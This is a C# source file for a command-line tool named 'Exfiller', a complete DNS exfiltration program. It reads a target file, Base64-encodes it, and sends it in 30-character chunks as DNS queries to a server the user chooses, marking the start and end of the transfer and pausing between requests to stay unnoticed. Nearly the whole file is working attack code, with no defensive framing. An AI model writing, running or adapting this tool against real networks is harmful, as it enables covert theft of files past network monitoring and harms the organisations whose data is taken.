using CommandLine;
using DnsClient;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;



namespace Exfiller
{
	class Program
	{
		public class Options
		{
			[Option('f', "file", Required = true, HelpText = "Target file to send.")]
			public String TargetFile { get; set; }

			[Option('s', "dns-server", Required = true, HelpText = "Target DNS Server.")]
			public String DNSServer { get; set; }

			[Option('p', "dns-port", Required = false, HelpText = "Target DNS Port (Defaults to 53).")]
			public int DNSPort { get; set; }

			[Option('d', "delay", Required = false, HelpText = "Delay (in milliseconds) between each request.")]
			public int Delay { get; set; }
		}

		static void Main(string[] args)
		{
			var opts = new Options();

			var ParserResult = Parser.Default
				.ParseArguments<Options>(args)
				.WithParsed(parsed => opts = parsed);
			if (ParserResult.Tag == ParserResultType.NotParsed)
			{
				// Help text requested, or parsing failed. Exit.
				System.Environment.Exit(1);
			}


			// Setup DNSClient variables using command line argument as the target DNS server
			String targetDNSServer = opts.DNSServer.ToString();
			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), 53);
			var client = new LookupClient(endpoint);

			// Target domain to append Base64 encoded data to.  This doesn't really matter and doesn't need to be valid
			String targetDomain = ".test.local";

			var targetFile = opts.TargetFile.ToString();
			var delayTime = opts.Delay;

			if (File.Exists(targetFile))
			{
				var fileContentBytes = File.ReadAllBytes(targetFile);
				String b64File = Convert.ToBase64String(fileContentBytes);
				// Convert any equals signs to dashes so they can be included in a URL
				b64File = b64File.Replace("=", "-");

				Stopwatch stopwatch = new Stopwatch();
				stopwatch.Start();

				// Loop over Base64 data and send 30 characters at a time as a DNS request appended to the provided domain
				Console.WriteLine("\n[*] Sending DNS requests to " + targetDNSServer);

				// Set counter to start at 1 and send start of file identifier
				client.Query("11111" + targetFile.Replace(".", "-") + "11111" + targetDomain, QueryType.A);
				int counter = 1;

				for (int i = 0; i < b64File.Length; i += 30)
				{
					try
					{
						var result = client.Query(b64File.Substring(i, 30) + targetDomain, QueryType.A);
						counter++;
					}
					catch
					{
						var result = client.Query(b64File.Substring(i) + targetDomain, QueryType.A);
						counter++;
					}

					Thread.Sleep(delayTime);
				}

				// Send end of file identifier
				client.Query("000000000000000" + targetDomain, QueryType.A);

				stopwatch.Stop();

				Console.WriteLine($"\n[+] Successfully sent file '{targetFile}' over {counter} DNS requests to {targetDNSServer}");
				Console.WriteLine($"\n[*] Time elasped: {((int)stopwatch.Elapsed.TotalSeconds)} seconds");

				//b64File = b64File.Replace("-", "=");
				//Byte[] b64FileBytes = Convert.FromBase64String(b64File);
				//String originalFile = Encoding.Default.GetString(b64FileBytes);
				//Console.WriteLine("\nOriginal content: " + originalFile);
			}
			else
			{
				Console.WriteLine("Error reading file!");
			}




			

		}
	}
}
